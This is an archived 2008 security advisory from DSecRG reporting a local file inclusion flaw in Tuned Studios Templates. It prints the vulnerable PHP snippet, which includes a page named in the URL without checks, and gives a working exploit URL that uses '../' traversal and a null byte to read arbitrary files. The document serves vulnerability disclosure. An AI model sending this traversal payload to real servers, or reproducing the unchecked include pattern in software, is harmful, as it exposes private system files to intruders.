@@ -1,0 +1,64 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG08-001
+
+
+Application:                    Tuned Studios Templates
+Versions Affected:              All
+Vendor URL:                     http:/www.tunedstudios.com
+Bug:                            Local File Include
+Exploits:                       YES
+Reported:                       09.01.2008
+Date of Public Advisory:        09.01.2008
+Authors:                        Alexandr Polyakov, Stas Svistunovich
+                                Digital Security Reasearch Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Tuned Studios Templates has Local File Include vulnerability in page phpversion/index.php
+
+
+Details
+*******
+
+Tuned Studios has many templates based on same php code.
+
+Code
+****
+
+############################################
+ //First check if $page exists
+  //With the introduction of PHP 5 we have to capture the $page from the url.
+  $page = $_GET['page'];
+
+  if(isset($page) && $page != '')
+  {
+      //Check if the page $page exists
+      if(file_exists($page.'.php'))
+      {
+           //Now we can include the page.
+           include($page.'.php');
+      }
+      else
+      {
+           //Page can't be found, include the error file
+           include('data/error404.data.php');
+      }
+  }
+############################################
+
+Example:
+
+http://[server]/[installdir]/index.php?page=../../../../../../../[file]%00
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-01-09]
